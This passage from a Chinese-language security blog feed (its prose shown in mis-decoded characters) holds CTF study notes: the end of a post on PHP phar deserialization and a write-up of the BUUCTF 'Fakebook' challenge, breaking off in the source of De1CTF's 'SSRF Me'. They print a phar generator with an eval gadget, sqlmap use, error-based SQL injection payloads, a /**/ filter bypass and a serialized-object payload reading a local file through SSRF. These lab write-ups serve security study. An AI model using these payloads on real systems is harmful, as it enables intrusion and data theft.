<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/demo/demo1/vlun/upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å®ç°è¿‡ç¨‹"><a href="#å®ç°è¿‡ç¨‹" class="headerlink" title="å®ç°è¿‡ç¨‹"></a>å®ç°è¿‡ç¨‹</h2><p>é¦–å…ˆæ˜¯æ ¹æ®file_un.phpå†™ä¸€ä¸ªç”Ÿæˆpharçš„phpæ–‡ä»¶ï¼Œå½“ç„¶éœ€è¦ç»•è¿‡gifï¼Œæ‰€ä»¥éœ€è¦åŠ GIF89aï¼Œç„¶åæˆ‘ä»¬è®¿é—®è¿™ä¸ªphpæ–‡ä»¶åï¼Œç”Ÿæˆäº†phar.pharï¼Œä¿®æ”¹åç¼€ä¸ºgifï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ©ç”¨file_existsï¼Œä½¿ç”¨phar://æ‰§è¡Œä»£ç </p>
<h2 id="æ„é€ ä»£ç "><a href="#æ„é€ ä»£ç " class="headerlink" title="æ„é€ ä»£ç "></a>æ„é€ ä»£ç </h2><p><code>eval.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'eval.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—®eval.phpï¼Œä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆphar.pharï¼Œç„¶åä¿®æ”¹åç¼€ gif</p>
<p>æ¥ç€ä¸Šä¼ ,æ–‡ä»¶ä¼šä¸Šä¼ åˆ°upload_fileç›®å½•ä¸‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau341pj30ix06cq31.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiau341pj30ix06cq31.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶ååˆ©ç”¨<code>file_un.php</code>ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">filename&#x3D;phar:&#x2F;&#x2F;upload_file&#x2F;eval.gif</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiauayfbj30su0epaap.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9iiauayfbj30su0epaap.jpg" class="lazyload" title="test"></a></p>
<p>æ ¹æ®ä»¥ä¸Šå¯ä»¥çŸ¥é“åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹</p>
<ul>
<li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li>
<li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li>
<li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸” <code>:</code> <code>/</code> <code>phar</code> ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li>
</ul>
<hr>
<h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a><br><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="noopener">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay4</title>
    <url>/yakko117/2019/11/25/BuuctfDay4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-Day4"><a href="#BUUCTF-Day4" class="headerlink" title="BUUCTF Day4"></a>BUUCTF Day4</h1><h2 id="ç½‘é¼æ¯-Fakebook"><a href="#ç½‘é¼æ¯-Fakebook" class="headerlink" title="ç½‘é¼æ¯ Fakebook"></a>ç½‘é¼æ¯ Fakebook</h2><p>è€ƒç‚¹ SSRF åˆ©ç”¨</p>
<p>é¢˜ç›®ä¸€è§ˆå‘ç° <code>login</code> å’Œ <code>join</code>ï¼Œç™»é™†ä¸äº†adminï¼Œ é‚£å°±å…ˆæ³¨å†Œä¸€ä¸ª<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piofvnij30yt088glz.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piofvnij30yt088glz.jpg" class="lazyload" title="test"></a></p>
<p>æ³¨å†Œå®Œä¹‹åï¼Œå‘ç°urlä¸Šå¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œå°è¯•æ³¨å…¥ï¼ŒæŠ¥é”™çš„åˆ°è·¯å¾„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># view.php?no&#x3D;1%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] query error! (You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;&#39; at line 1)</span><br><span class="line"></span><br><span class="line">Fatal error: Call to a member function fetch_assoc() on boolean in &#x2F;var&#x2F;www&#x2F;html&#x2F;db.php on line 66</span><br><span class="line"></span><br><span class="line"># view.php?no&#x3D;* å½“ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„noæ—¶ï¼Œè¿”å›å¦‚ä¸‹</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piogowdj312k0g13z8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piogowdj312k0g13z8.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="æ‰«æå¦‚ä¸‹"><a href="#æ‰«æå¦‚ä¸‹" class="headerlink" title="æ‰«æå¦‚ä¸‹"></a>æ‰«æå¦‚ä¸‹</h3><p> å‘ç°éšè—çš„ <code>/user.php.bak</code> åœ¨ <code>robots.txt</code> é‡Œ<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piox658j30xu0guk6p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97piox658j30xu0guk6p.jpg" class="lazyload" title="test"></a></p>
<p>è¾“å…¥åˆ°åœ°å€æ ï¼Œå¾—åˆ°æ–‡ä»¶ã€‚åŒæ—¶æ‰«æè¿˜å‘ç° <code>flag.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># user.php.bak æºç è§£æå¦‚ä¸‹</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        <span class="comment">/*curl_init()ï¼šåˆå§‹åŒ–ä¸€ä¸ª cURL ä¼šè¯å¹¶ä¸”å…¨éƒ¨çš„é€‰é¡¹éƒ½è¢«è®¾ç½®åè¢«è°ƒç”¨*/</span></span><br><span class="line"> </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_setopt â€” ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹ã€‚</span></span><br><span class="line"><span class="comment">            è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment">                bool curl_setopt ( resource $ch , int $option , mixed $value )</span></span><br><span class="line"><span class="comment">            å‚æ•°:</span></span><br><span class="line"><span class="comment">                chï¼šç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚</span></span><br><span class="line"><span class="comment">                optionï¼šéœ€è¦è®¾ç½®çš„CURLOPT_XXXé€‰é¡¹ã€‚</span></span><br><span class="line"><span class="comment">                valueï¼šå°†è®¾ç½®åœ¨optioné€‰é¡¹ä¸Šçš„å€¼ã€‚</span></span><br><span class="line"><span class="comment">                å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªboolç±»å‹çš„å€¼ï¼š</span></span><br><span class="line"><span class="comment">                CURLOPT_RETURNTRANSFERï¼šå°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span></span><br><span class="line"><span class="comment">            å¯¹äºä¸‹é¢çš„è¿™äº›optionçš„å¯é€‰å‚æ•°ï¼Œvalueåº”è¯¥è¢«è®¾ç½®ä¸€ä¸ªstringç±»å‹çš„å€¼ï¼š</span></span><br><span class="line"><span class="comment">                CURLOPT_URLï¼šéœ€è¦è·å–çš„URLåœ°å€ï¼Œä¹Ÿå¯ä»¥åœ¨curl_init()å‡½æ•°ä¸­è®¾ç½®ã€‚</span></span><br><span class="line"><span class="comment">                         </span></span><br><span class="line"><span class="comment">    æ–‡ä»¶æµçš„å½¢å¼:æŒ‡çš„æ˜¯åœ¨ä¼ é€’è¿‡ç¨‹ä¸­çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä½ ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œé‚£ä¹ˆä»–ä¸æ˜¯ä»¥ä¸€ä¸ªå®Œæ•´çš„å›¾ç‰‡ä¼ è¾“çš„ï¼Œæ˜¯å°†æ–‡ä»¶æŒ‰ç‰¹å®šç¼–ç çš„å­—ç¬¦ä¼ è¾“</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        <span class="comment">/*curl_exec ï¼šæ‰§è¡Œ cURL ä¼šè¯*/</span></span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            curl_getinfo â€” è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯</span></span><br><span class="line"><span class="comment">                è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )è·å–æœ€åä¸€æ¬¡ä¼ è¾“çš„ç›¸å…³ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="comment">                å‚æ•°ï¼š</span></span><br><span class="line"><span class="comment">                      ch ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚</span></span><br><span class="line"><span class="comment">                      optï¼šè¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯ä»¥ä¸‹å¸¸é‡ä¹‹ä¸€:</span></span><br><span class="line"><span class="comment">                            CURLINFO_HTTP_CODE : æœ€åä¸€ä¸ªæ”¶åˆ°çš„HTTPä»£ç </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.jpg)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="å°è¯•æ³¨å…¥"><a href="#å°è¯•æ³¨å…¥" class="headerlink" title="å°è¯•æ³¨å…¥"></a>å°è¯•æ³¨å…¥</h3><p>åœ¨joiné¡µé¢æ‹¦æˆªPOSTæ•°æ®åŒ…ï¼Œä¿å­˜ä¸º <code>POST.txt</code> ï¼Œ ç„¶åç”¨sqlmapè·‘</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/join.ok.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Origin</span>: http://c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://c44d7803-daf6-41ff-8d40-9650e8c03b74.node3.buuoj.cn/join.php</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ld71hiq3mijrvi6n4rckvnpli5</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=admin1&amp;passwd=admin&amp;age=18&amp;blog=www.hello.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># sqlmap -r /root/ä¸‹è½½/post.txt --dump -tables</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°dataæ˜¯åºåˆ—åŒ–ä¿å­˜çš„ï¼ŒçŒœæµ‹åå°æ˜¯é€šè¿‡ååºåˆ—åŒ–dataåè¾“å‡ºå‰ç«¯ç»“æœ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pip5rorj30st0i9h0r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pip5rorj30st0i9h0r.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="Fuzzæµ‹è¯•"><a href="#Fuzzæµ‹è¯•" class="headerlink" title="Fuzzæµ‹è¯•"></a>Fuzzæµ‹è¯•</h3><h4 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h4><p>è¿™é‡Œå­˜åœ¨å¯¹ç©ºæ ¼çš„è¿‡æ»¤ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;1++order++by+4--+</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj1dwj30zl0e3mzo.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj1dwj30zl0e3mzo.jpg" class="lazyload" title="test"></a></p>
<p>åŒæ—¶åŸæ¥çš„sqlmap å·²ç»è·‘å‡ºäº†è¡¨ååˆ—å<br>å½“ç„¶çœ‹å¤§ä½¬çš„wpï¼Œè‡ªå·±æ‰‹æ³¨ä¹Ÿè¡Œ</p>
<h4 id="çˆ†è¡¨å"><a href="#çˆ†è¡¨å" class="headerlink" title="çˆ†è¡¨å"></a>çˆ†è¡¨å</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view.php?no&#x3D;1+and+updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;database())),1)#</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioi9z4j30sb041aaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioi9z4j30sb041aaa.jpg" class="lazyload" title="test"></a></p>
<h4 id="çˆ†åˆ—å"><a href="#çˆ†åˆ—å" class="headerlink" title="çˆ†åˆ—å"></a>çˆ†åˆ—å</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;1+and+updatexml(1,make_set(3,&#39;~&#39;,(select+group_concat(column_name)+from information_schema.columns+where+table_name&#x3D;&quot;users&quot;)),1)#</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioid7aj30rv0433yt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioid7aj30rv0433yt.jpg" class="lazyload" title="test"></a></p>
<p>åˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure></div>

<p>ç›´æ¥ç”¨ <code>union select</code> ä¼šè¢«WAFæ£€æµ‹åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>/**/</code> æ¥ç»•è¿‡ï¼Œååºåˆ—åŒ–å­—ç¬¦ä¸²å¯¹åº”æ•°æ®åº“dataåˆ—æ”¾åœ¨ç¬¬å››åˆ—ï¼ˆfuzzæµ‹è¯•ï¼Œçˆ†åˆ—åï¼‰ï¼Œæ³¨å…¥åblogæ æ˜¾ç¤º <code>file:///var/www/html/flag.php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj12qj30si072q2x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj12qj30si072q2x.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°ä¸€æ®µbase64åŠ å¯†çš„srcï¼Œè¿›å…¥å¾—åˆ°flag</p>
<hr>
<h3 id="ä¸€äº›å°hits"><a href="#ä¸€äº›å°hits" class="headerlink" title="ä¸€äº›å°hits"></a>ä¸€äº›å°hits</h3><ul>
<li><p>cURLæ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œ1997å¹´é¦–æ¬¡å‘è¡Œã€‚å®ƒæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Œæ‰€ä»¥æ˜¯ç»¼åˆä¼ è¾“å·¥å…·ï¼Œä½†æŒ‰ä¼ ç»Ÿï¼Œä¹ æƒ¯ç§°cURLä¸ºä¸‹è½½å·¥å…·ã€‚cURLè¿˜åŒ…å«äº†ç”¨äºç¨‹åºå¼€å‘çš„libcurlã€‚</p>
</li>
<li><p>PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚</p>
</li>
<li><p>libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚<br>PHPä¸­ä½¿ç”¨cURLå®ç°Getå’ŒPostè¯·æ±‚çš„æ–¹æ³•<br>è¿™äº›å‡½æ•°åœ¨PHP 4.0.2ä¸­è¢«å¼•å…¥ã€‚</p>
</li>
</ul>
<hr>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><ul>
<li>ç›´æ¥æŸ¥çœ‹é¡µé¢æºä»£ç å¯ä»¥çœ‹åˆ°æ­£ç¡®æ ¼å¼çš„ä»£ç <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span 